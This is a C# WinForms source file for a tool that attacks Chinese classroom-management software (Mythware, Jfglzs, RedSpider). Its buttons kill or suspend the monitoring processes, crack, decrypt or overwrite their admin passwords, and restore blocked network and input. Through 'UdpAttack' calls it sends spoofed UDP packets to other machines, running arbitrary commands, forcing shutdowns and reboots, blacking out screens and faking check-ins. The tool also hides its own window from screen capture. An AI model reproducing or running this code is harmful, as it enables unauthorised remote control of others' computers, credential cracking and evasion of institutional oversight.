using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using T4CLLibrary;
using T4CLLibrary.Mythware;
using T4CLLibrary.RedSpider;

namespace DemoGUI
{
    public partial class Form1 : Form
    {
        Thread _keyboardThread;
        Thread _mouseThread;
        Thread _windowingThread;
        Thread _heartBeatThread;
        bool _isHeartBeating = false;
        List<PhysicalAddress> macAddrs = new List<PhysicalAddress>();
        PhysicalAddress chosenMacAddr;
        T4CLLibrary.Jfglzs.JfglzsVersion passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V9_9;
        public Form1()
        {
            InitializeComponent();
            

            //解禁键盘鼠标
            _keyboardThread = new Thread(OtherTools.EnableKeyboardByHook);
            _keyboardThread.IsBackground = true;
            _keyboardThread.Start();
            _mouseThread = new Thread(OtherTools.EnableMouseByHook);
            _mouseThread.IsBackground = true;
            _mouseThread.Start();

            try
            {
                var interfaces = NetworkInterface.GetAllNetworkInterfaces();
                
                foreach (var ni in interfaces)
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        var mac = ni.GetPhysicalAddress();
                        macAddrs.Add(mac);
                    }
                }
                comboBoxMac.Items.AddRange(macAddrs.Select(m => m.ToString()).ToArray());
                if(comboBoxMac.Items.Count > 0)
                {
                    comboBoxMac.SelectedIndex = 0;
                    chosenMacAddr = macAddrs[0];
                }
            }
            catch (Exception ex)
            {
                ShowError($"获取MAC地址失败: {ex.Message}");
            }

            textBoxUserName.Text = Environment.UserName;
            textBoxMachineName.Text = Environment.MachineName;

        }



        private void HeartBeat()
        {
            try
            {
                var userName = textBoxUserName.Text;
                var machineName = textBoxMachineName.Text;
                while (true)
                {
                    var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                    

                    this.Invoke(new Action(() =>
                    {
                        chosenMacAddr = PhysicalAddress.Parse(comboBoxMac.Text);
                    }));
                    
                    T4CLLibrary.RedSpider.UdpAttack.SendHeartBeatPacket(chosenMacAddr,textBoxIP.Text, port, userName, machineName);
                    Thread.Sleep(1000);
                }
            }
            catch(ThreadAbortException)
            {
                return;
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() => ShowError($"发送心跳包失败: {ex.Message}")));
            }
            
            
        }

        private void ShowError(string message)
        {
            MessageBox.Show(message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ShowInfo(string message)
        {
            MessageBox.Show(message, "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void buttonKillJF_Click(object sender, EventArgs e)
        {
            try
            {
                switch (passwordType)
                {
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_03:
                        T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcessV11_03();
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_06:
                        T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcessV11_03();
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_6:
                        T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcessV11_6();
                        break;
                    default:
                        T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcesses();
                        break;
                }
                ShowInfo("机房管理助手进程已结束");

            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonKillJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.KillAllProcesses();
                ShowInfo("极域进程已结束");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonSuspendJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.SuspendMainProcess();
                ShowInfo("极域主进程已挂起");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonResumeJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.ResumeMainProcess();
                ShowInfo("极域主进程已恢复");
            }
            catch (Exception ex)
            { 
                ShowError(ex.Message);
            }
        }

        private void buttonTmpPwd_Click(object sender, EventArgs e)
        {
            string pwd;
            switch (passwordType)
            {
                case T4CLLibrary.Jfglzs.JfglzsVersion.V9_9:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
                    break;
                case T4CLLibrary.Jfglzs.JfglzsVersion.V9_99:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
                    break;
                case T4CLLibrary.Jfglzs.JfglzsVersion.V10_1:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPasswordV10_1();
                    break;
                case T4CLLibrary.Jfglzs.JfglzsVersion.V10_2:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPasswordV10_1();
                    break;
                case T4CLLibrary.Jfglzs.JfglzsVersion.V11_03:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPasswordV11_03();
                    break;
                case T4CLLibrary.Jfglzs.JfglzsVersion.V11_06:
                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPasswordV11_06();
                    break;
                default:
                    ShowError("未知密码类型");
                    return;
            }
            Clipboard.SetText(pwd);
            ShowInfo($"生成的临时密码为：{pwd}, 已复制到剪切板");
        }

        

        private void buttonJFPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var pwd = textBoxPwd.Text;
                string encryptedPwd;
                if (string.IsNullOrEmpty(pwd))
                {
                    ShowError("请输入密码");
                    return;
                }
                switch (passwordType)
                {
                    
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V9_9:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V9_99:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV9_99(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V10_1:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV10_1(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd, T4CLLibrary.Jfglzs.JfglzsVersion.V10_1);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V10_2:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV10_2(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd,T4CLLibrary.Jfglzs.JfglzsVersion.V10_2);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_03:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV11_03(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd, T4CLLibrary.Jfglzs.JfglzsVersion.V11_03);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_06:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV11_03(pwd);
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd, T4CLLibrary.Jfglzs.JfglzsVersion.V11_03);
                        break;
                    case T4CLLibrary.Jfglzs.JfglzsVersion.V11_6:
                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordV11_03(pwd);//1160同1103
                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd, T4CLLibrary.Jfglzs.JfglzsVersion.V11_03);
                        break;
                    default:
                        break;
                }
                ShowInfo("密码已设置");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonJYPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var pwd = textBoxPwd.Text;
                if (string.IsNullOrEmpty(pwd))
                {
                    ShowError("请输入密码");
                    return;
                }
                var encryptedPwd = T4CLLibrary.Mythware.PasswordCracker.EncryptPassword(pwd);
                T4CLLibrary.Mythware.PasswordCracker.SetEncryptedPassword(encryptedPwd);
                ShowInfo("密码已设置");
            }
            catch (UnauthorizedAccessException)
            {
                ShowError("访问被拒绝，请以管理员身份运行本程序");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private async void buttonGetJFPwd_Click(object sender, EventArgs e)
        {
            if (passwordType != T4CLLibrary.Jfglzs.JfglzsVersion.V9_99)
            {
                ShowError("仅能在9.99版获取密码");
                return;
            }

            buttonGetJFPwd.Enabled = false;

            try
            {
                labelJFPwdCrackState.Text = "正在获取密码...";
                var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.GetEncryptedPassword();
                List<string> decryptedPwd = new List<string>();
                await Task.Run(() => {
                    decryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.DecryptPassword(encryptedPwd).ToList(); 
                });
                if (decryptedPwd.Count == 0)
                {
                    ShowError("获取密码失败");
                }
                else
                {
                    ShowInfo($"获取密码成功: {string.Join(",", decryptedPwd)}");
                }
            }
            catch (Exception ex)
            {
                ShowError($"获取密码失败{ex.Message}");
            }
            finally
            {
                labelJFPwdCrackState.Text = "";
                buttonGetJFPwd.Enabled = true;
            }


        }

        private void buttonGetJYPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var encryptedPwd = T4CLLibrary.Mythware.PasswordCracker.GetEncryptedPassword();
                var decryptedPwd = T4CLLibrary.Mythware.PasswordCracker.DecryptPassword(encryptedPwd);
                ShowInfo($"获取密码成功: {decryptedPwd}");
            }
            catch (Exception ex)
            {
                ShowError($"获取密码失败{ex.Message}");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            labelJFPwdCrackState.Text = "";
        }

        private void buttonSuspend_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.SuspendProcessByName(processName);
                ShowInfo($"进程 {processName} 已挂起");
            }
            catch (Exception ex)
            {
                ShowError($"挂起进程失败: {ex.Message}");
            }
        }

        private void buttonResume_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.ResumeProcessByName(processName);
                ShowInfo($"进程 {processName} 已恢复");
            }
            catch (Exception ex)
            {
                ShowError($"恢复进程失败: {ex.Message}");
            }
        }

        private void buttonKill_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.KillProcessByName(processName);
                ShowInfo($"进程 {processName} 已结束");
            }
            catch (Exception ex)
            {
                ShowError($"结束进程失败: {ex.Message}");
            }
        }

        private void buttonSendMsg_Click(object sender, EventArgs e)
        {
            try
            {
                var msg = textBoxSendText.Text;
                var ports = textBoxPort.Text.Split(',');
                foreach (var port in ports)
                {
                    T4CLLibrary.Mythware.UdpAttack.SendMessage(msg, T4CLLibrary.Mythware.CommandType.SendMessage, textBoxIP.Text, int.Parse(port));
                }
                ShowInfo($"发送消息: {msg} 到 {textBoxIP.Text}的{textBoxPort.Text}端口");
            }
            catch (Exception ex)
            {
                ShowError($"发送消息失败: {ex.Message}");
            }
        }

        private void buttonSendCmd_Click(object sender, EventArgs e)
        {
            try
            {
                var cmd = textBoxSendText.Text;
                var ports = textBoxPort.Text.Split(',');
                foreach (var port in ports)
                {
                    if (checkBox2021Ver.Checked)
                    {
                        T4CLLibrary.Mythware.UdpAttack.SendMessage(cmd, T4CLLibrary.Mythware.CommandType.ExecuteCommand2021, textBoxIP.Text, int.Parse(port));
                    }
                    else
                    {
                        T4CLLibrary.Mythware.UdpAttack.SendMessage(cmd, T4CLLibrary.Mythware.CommandType.ExecuteCommand, textBoxIP.Text, int.Parse(port));
                    }
                }
                ShowInfo($"发送命令: {cmd} 到 {textBoxIP.Text}的{textBoxPort.Text}端口");
            }
            catch (Exception ex)
            {
                ShowError($"发送命令失败: {ex.Message}");
            }
        }

        private void buttonSendShutdown_Click(object sender, EventArgs e)
        {
            try
            {
                var ports = textBoxPort.Text.Split(',');
                foreach (var port in ports)
                {
                    T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Shutdown, textBoxIP.Text, int.Parse(port));
                }
                ShowInfo($"发送关机命令到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送关机命令失败: {ex.Message}");
            }
        }

        private void buttonSendReboot_Click(object sender, EventArgs e)
        {
            try
            {
                var ports = textBoxPort.Text.Split(',');
                foreach (var port in ports)
                {
                    T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Reboot, textBoxIP.Text, int.Parse(port));
                }
                ShowInfo($"发送重启命令到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送重启命令失败: {ex.Message}");
            }
        }

        private void buttonGetPort_Click(object sender, EventArgs e)
        {
            try
            {
                var result = T4CLLibrary.Mythware.UdpAttack.GetMythwareListeningPorts();
                if (result == null || result.Count() == 0)
                {
                    ShowError("获取端口失败");
                    return;
                }
                var ports = string.Join(",", result);
                ShowInfo($"获取端口成功: {ports}, 已复制到剪切板");
                Clipboard.SetText(ports);
            }
            catch (Exception ex)
            {
                ShowError($"获取端口失败: {ex.Message}");
            }
        }

        private void buttonDbg_Click(object sender, EventArgs e)
        {
            //try
            //{
            //    var num = int.Parse(textBoxPwd.Text);
            //    T4CLLibrary.Mythware.NetworkHelper.Test(num);
            //    ShowInfo($"测试成功: {num}");
            //}
            //catch (Exception ex)
            //{
            //    ShowError(ex.Message);
            //}
            //Thread.Sleep(10000);



            //try
            //{
            //    var tmpPwd1002 = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPasswordV10_1();
            //    ShowInfo($"生成的临时密码为：{tmpPwd1002}, 已复制到剪切板");
            //    Clipboard.SetText(tmpPwd1002);
            //}
            //catch (Exception ex)
            //{
            //    ShowError(ex.Message);
            //}

            //try
            //{
            //    var openFileDialog = new OpenFileDialog();
            //    if (openFileDialog.ShowDialog() == DialogResult.OK)
            //    {
            //        var filePath = openFileDialog.FileName;
            //        var fileName = Path.GetFileName(filePath);
            //        var fileBytes = File.ReadAllBytes(filePath);
            //        T4CLLibrary.Mythware.UdpAttack.SendFile(fileName, fileBytes, textBoxIP.Text, int.Parse(textBoxPort.Text));
            //        ShowInfo($"发送文件: {fileName} 到 {textBoxIP.Text}:{textBoxPort.Text}");
            //    }
            //}
            //catch (Exception ex)
            //{
            //    ShowError($"发送文件失败: {ex.Message}");
            //}
            //try
            //{
            //    var teacherIP = textBoxTeacherIP.Text;
            //    T4CLLibrary.RedSpider.UdpAttack.SendRespondCheckInPacket("AAA", "255.255.255.255",teacherIP:teacherIP);
            //    ShowInfo($"已发送");
            //}
            //catch (Exception ex)
            //{
            //    ShowError("错误: " + ex.Message);
            //}
            var rndName1103 = T4CLLibrary.Jfglzs.ProcessKiller.GetRandomProcessNameV11_03();
            ShowInfo($"1103进程名: {rndName1103}");

        }



       

        private void buttonDefullScreen_Click(object sender, EventArgs e)
        {
            buttonDefullScreen.Enabled = false;
            
            _windowingThread = new Thread(() =>
            {
                while (true)
                {
                    T4CLLibrary.Mythware.OtherTools.TrySetBroadcastWindowToNormal();
                    Thread.Sleep(1000);
                }
            });
            _windowingThread.IsBackground = true;
            _windowingThread.Start();
            ShowInfo("正在重复窗口化广播");
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        //实际9.99版，懒得改名字了
        private void radioButton09991002_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V9_99;
        }

        private void radioBtnL0999_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V9_9;
        }

        private void radioButtonG1002_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V10_2;
        }

        private void radioBtn1001_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V10_1;
        }

        private void buttonEnableNet_MouseClick(object sender, MouseEventArgs e)
        {
            if(e.Button == MouseButtons.Left)
            {
                try
                {
                    NetworkHelper.EnableNetwork();
                    var result = MessageBox.Show("已成功，若还是无法访问网络，请单击“是”以暴力结束（会结束机房管理助手和极域进程）", "提示", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                    if (result == DialogResult.Yes)
                    {
                        
                        NetworkHelper.EnableNetworkForce();
                        ShowInfo("成功");
                    }
                    else
                    {
                        ShowInfo("已取消");
                    }
                }
                catch (Exception ex)
                {
                    ShowError(ex.Message);
                }
            }
            else if (e.Button == MouseButtons.Right)
            {
                
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.SetDisplayAffinity(DisplayAffinity.Transparent);
        }

        private void buttonRSBlackScrn_Click(object sender, EventArgs e)
        {
            try
            {
                var ip = textBoxIP.Text;
                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendBlackScreenPacket(ip,port);
                ShowInfo($"已发送黑屏命令到 {ip}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送黑屏命令失败: {ex.Message}");
            }
        }

        private void buttonRSUnblackScrn_Click(object sender, EventArgs e)
        {
            try
            {
                var ip = textBoxIP.Text;
                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendBlackScreenPacket(ip, port,false);
                ShowInfo($"已发送解除黑屏命令到 {ip}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送接触黑屏命令失败: {ex.Message}");
            }
        }

        private void buttonRSCmd_Click(object sender, EventArgs e)
        {
            try
            {
                var path = textBoxRSFilePath.Text;
                var args = textBoxRSArgs.Text;
                var ip = textBoxIP.Text;
                int port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                var maximized = checkBoxRSForceOrMaximize.Checked;
                T4CLLibrary.RedSpider.UdpAttack.SendCommandPacket(path, args, ip, port,maximized);
                ShowInfo($"已发送命令到 {ip}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送命令失败: {ex.Message}");
            }
        }

        private void buttonKillRS_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.RedSpider.ProcessManager.KillAllProcesses();
                ShowInfo("红蜘蛛进程已结束");
            }
            catch (Exception ex)
            {
                ShowError($"结束进程失败{ex.Message}");
            }
        }

        private void buttonResumeRS_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.RedSpider.ProcessManager.ResumeMainProcess();
                ShowInfo("红蜘蛛主进程已恢复");
            }
            catch (Exception ex)
            {
                ShowError($"恢复进程失败{ex.Message}");
            }
        }

        private void buttonSuspendRS_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.RedSpider.ProcessManager.SuspendMainProcess();
                ShowInfo("红蜘蛛主进程已挂起");
            }
            catch (Exception ex)
            {
                ShowError($"挂起进程失败{ex.Message}");
            }
        }

        private void buttonRSShutdown_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                var force = checkBoxRSForceOrMaximize.Checked;
                T4CLLibrary.RedSpider.UdpAttack.SendShutdownPacket(textBoxIP.Text, port,force);
                ShowInfo($"已发送关机命令到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送关机命令失败: {ex.Message}");
            }
        }

        private void buttonRSAllowChat_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendAllowChatPacket(textBoxIP.Text, port, true);
                ShowInfo($"已发送允许聊天数据到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送允许聊天数据失败: {ex.Message}");
            }
        }

        private void buttonRSDisallowChat_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendAllowChatPacket(textBoxIP.Text, port, false);
                ShowInfo($"已发送禁止聊天数据到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送禁止聊天数据失败: {ex.Message}");
            }
        }

        private void buttonRSReboot_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                var force = checkBoxRSForceOrMaximize.Checked;
                T4CLLibrary.RedSpider.UdpAttack.SendRebootPacket(textBoxIP.Text, port, force);
                ShowInfo($"已发送重启数据到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送重启数据失败: {ex.Message}");
            }
        }

        private void buttonRSCheckIn_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendRequireCheckInPacket(textBoxIP.Text, port, textBoxTeacherIP.Text);
                ShowInfo($"已发送请求签到数据到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送请求签到数据失败: {ex.Message}");
            }
        }

        private void buttonRSRespondCheckIn_Click(object sender, EventArgs e)
        {
            try
            {
                var port = textBoxPort.Text != string.Empty ? int.Parse(textBoxPort.Text) : 1689;
                T4CLLibrary.RedSpider.UdpAttack.SendRespondCheckInPacket(textBoxRSStdName.Text, textBoxIP.Text, port, textBoxTeacherIP.Text);
                ShowInfo($"已发送响应签到数据到 {textBoxIP.Text}:{port}");
            }
            catch (Exception ex)
            {
                ShowError($"发送响应签到数据失败: {ex.Message}");
            }
        }

        private void buttonRSHeartBeat_Click(object sender, EventArgs e)
        {
            try
            {
                if (!_isHeartBeating)
                {
                    _isHeartBeating = true;
                    buttonRSHeartBeat.Text = "停止心跳";
                    _heartBeatThread = new Thread(HeartBeat)
                    {
                        IsBackground = true
                    };
                    _heartBeatThread.Start();
                }
                else
                {
                    _isHeartBeating = false;
                    buttonRSHeartBeat.Text = "开始心跳";
                    if (_heartBeatThread != null && _heartBeatThread.IsAlive)
                    {
                        _heartBeatThread.Abort();
                    }
                }
            }
            catch (Exception)
            {

                throw;
            }
        }

        private void radioButton1103_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V11_03;
        }

        private void radioButton1160_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V11_6;
        }

        private void buttonGetJFVer_Click(object sender, EventArgs e)
        {
            var version = T4CLLibrary.Jfglzs.Utils.GetVersionString();
            if (string.IsNullOrEmpty(version))
            {
                ShowError("获取版本失败");
            }
            else
            {
                ShowInfo($"版本号: {version}，请选择右侧单选框中最接近此版本且小于此版本的版本");
            }
        }

        private void radioButton1106_CheckedChanged(object sender, EventArgs e)
        {
            passwordType = T4CLLibrary.Jfglzs.JfglzsVersion.V11_06;
        }
    }
}
